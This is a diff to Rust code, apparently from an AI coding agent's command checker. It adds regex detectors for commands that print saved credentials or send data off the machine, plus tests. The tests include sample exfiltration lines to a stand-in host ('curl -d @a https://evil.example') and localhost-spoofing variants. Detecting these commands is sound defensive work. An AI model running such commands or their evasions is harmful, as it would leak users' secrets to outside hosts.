@@ -1368,6 +1368,95 @@ fn auto_safe_simple(p: &str) -> bool {
     }
 }
 
+/// Commands that hand out a saved login: the sandbox covers the files and the
+/// macOS keychain, but a command the user approves runs outside it.
+pub fn reads_credentials(cmd: &str) -> bool {
+    use std::sync::OnceLock;
+    static RE: OnceLock<regex::Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        regex::Regex::new(
+            r"(?x)(^|[\s;&|(`])(
+                gh\s+auth\s+token
+              | glab\s+auth\s+(token|status\s+.*--show-token)
+              | git\s+credential(-\S+)?\s+(fill|get)
+              | security\s+(find-(generic|internet)-password|dump-keychain)
+              | aws\s+(configure\s+(get|export-credentials)|sts\s+get-session-token|ecr\s+get-login-password)
+              | gcloud\s+auth\s+(print-access-token|print-identity-token)
+              | az\s+account\s+get-access-token
+              | op\s+(read|item\s+get)
+              | npm\s+token\b
+              | secret-tool\s+lookup
+              | pass\s+show
+            )",
+        )
+        .unwrap()
+    })
+    .is_match(cmd)
+}
+
+/// Commands that send data out of the machine, as opposed to fetching it. Once
+/// a session has read something from outside, auto mode asks before these.
+pub fn sends_data_out(cmd: &str) -> bool {
+    split_shell(cmd)
+        .iter()
+        .any(|part| part_sends_data_out(part) && !only_reaches_this_machine(part))
+}
+
+/// A `curl` or `wget` at this machine's own server: testing an API you're
+/// running sends nothing anywhere. Anything else that could be a host, or a
+/// variable that could hold one, doesn't count as local.
+fn only_reaches_this_machine(part: &str) -> bool {
+    let mut words = part.split_whitespace();
+    if !matches!(words.next(), Some("curl" | "wget")) {
+        return false;
+    }
+    let local = |host: &str| matches!(host, "localhost" | "127.0.0.1" | "[::1]");
+    let mut saw_local = false;
+    for word in words {
+        let word = word.trim_matches(['"', '\'']);
+        if word.contains('$') || word.contains('`') {
+            return false;
+        }
+        if word.starts_with('-') || word.starts_with('@') {
+            continue;
+        }
+        let with_scheme = if word.contains("://") {
+            word.to_string()
+        } else {
+            format!("http://{word}")
+        };
+        let host = reqwest::Url::parse(&with_scheme)
+            .ok()
+            .and_then(|u| u.host_str().map(str::to_string));
+        match host {
+            Some(h) if local(&h) => saw_local = true,
+            // A flag's value like `{}` or `POST` isn't a host; `a.b` might be.
+            _ if word.contains("://") || word.contains('.') => return false,
+            _ => {}
+        }
+    }
+    saw_local
+}
+
+fn part_sends_data_out(cmd: &str) -> bool {
+    use std::sync::OnceLock;
+    static RE: OnceLock<regex::Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        regex::Regex::new(
+            r"(?x)(^|[\s;&|(`])(
+                curl\b.*(\s(-d|--data\S*|-F|--form\S*|-T|--upload-file|--json)(\s|=|\S)|\s-X\s*(POST|PUT|PATCH)|\s--request[\s=]+(POST|PUT|PATCH))
+              | wget\s.*--(post|body)-(data|file)
+              | (nc|ncat|netcat|socat|telnet)\s
+              | (scp|sftp|ssh|rsync)\s.*[@:]
+              | (dig|nslookup|host|ping)\s.*\$
+              | /dev/(tcp|udp)/
+            )",
+        )
+        .unwrap()
+    })
+    .is_match(cmd)
+}
+
 /// Whether this repository's own git config names programs for git to run: diff
 /// and filter drivers, an fsmonitor, a pager or an included file. A "read-only"
 /// `git diff` runs them. Few repositories have any, and Git LFS's are standard.
@@ -1440,52 +1529,6 @@ fn git_would_run_repo_programs(cmd: &str, cwd: &Path) -> bool {
     GIT.get_or_init(|| regex::Regex::new(r"(^|[\s;&|(`])git\s").unwrap())
         .is_match(cmd)
         && repo_config_runs_programs(cwd)
-
-/// Commands that hand out a saved login: the sandbox covers the files and the
-/// macOS keychain, but a command the user approves runs outside it.
-pub fn reads_credentials(cmd: &str) -> bool {
-    use std::sync::OnceLock;
-    static RE: OnceLock<regex::Regex> = OnceLock::new();
-    RE.get_or_init(|| {
-        regex::Regex::new(
-            r"(?x)(^|[\s;&|(`])(
-                gh\s+auth\s+token
-              | glab\s+auth\s+(token|status\s+.*--show-token)
-              | git\s+credential(-\S+)?\s+(fill|get)
-              | security\s+(find-(generic|internet)-password|dump-keychain)
-              | aws\s+(configure\s+(get|export-credentials)|sts\s+get-session-token|ecr\s+get-login-password)
-              | gcloud\s+auth\s+(print-access-token|print-identity-token)
-              | az\s+account\s+get-access-token
-              | op\s+(read|item\s+get)
-              | npm\s+token\b
-              | secret-tool\s+lookup
-              | pass\s+show
-            )",
-        )
-        .unwrap()
-    })
-    .is_match(cmd)
-}
-
-/// Commands that send data out of the machine, as opposed to fetching it. Once
-/// a session has read something from outside, auto mode asks before these.
-pub fn sends_data_out(cmd: &str) -> bool {
-    use std::sync::OnceLock;
-    static RE: OnceLock<regex::Regex> = OnceLock::new();
-    RE.get_or_init(|| {
-        regex::Regex::new(
-            r"(?x)(^|[\s;&|(`])(
-                curl\b.*(\s(-d|--data\S*|-F|--form\S*|-T|--upload-file|--json)(\s|=|\S)|\s-X\s*(POST|PUT|PATCH)|\s--request[\s=]+(POST|PUT|PATCH))
-              | wget\s.*--(post|body)-(data|file)
-              | (nc|ncat|netcat|socat|telnet)\s
-              | (scp|sftp|ssh|rsync)\s.*[@:]
-              | (dig|nslookup|host|ping)\s.*\$
-              | /dev/(tcp|udp)/
-            )",
-        )
-        .unwrap()
-    })
-    .is_match(cmd)
 }
 
 pub fn dangerous_reason(cmd: &str) -> Option<String> {
@@ -2778,7 +2821,10 @@ mod tests {
             "[user]\n\tname = pager\n",
         ] {
             assert!(!config_runs_programs(config), "{config}");
+        }
+    }
 
+    #[test]
     fn saved_logins_and_outgoing_data_are_recognised() {
         for cmd in [
             "gh auth token",
@@ -2815,8 +2861,24 @@ mod tests {
         ] {
             assert!(sends_data_out(cmd), "{cmd}");
         }
-        // Everyday fetching and building isn't sending.
         for cmd in [
+            "curl -d @a http://localhost:3000 https://evil.example",
+            "curl -d @a http://localhost.evil.example/",
+            "curl -d @a http://127.0.0.1.evil.example/",
+            "curl -d @a http://localhost@evil.example/",
+            "curl -d @a $URL",
+            "curl -d @a evil.example",
+            "curl -X POST localhost:3000; curl -d @a https://evil.example",
+        ] {
+            assert!(sends_data_out(cmd), "{cmd}");
+        }
+        // Everyday fetching and building isn't sending, and nor is testing a
+        // server on this machine.
+        for cmd in [
+            "curl -X POST http://localhost:3000/api -d '{}'",
+            "curl -d @a 127.0.0.1:8080/x",
+            "curl --json x http://[::1]:3000/",
+            "wget --post-data=x http://localhost/",
             "curl -fsSL https://example.com/a.tar.gz -o a.tar.gz",
             "curl -s https://api.example.com/x",
             "wget https://example.com/a",
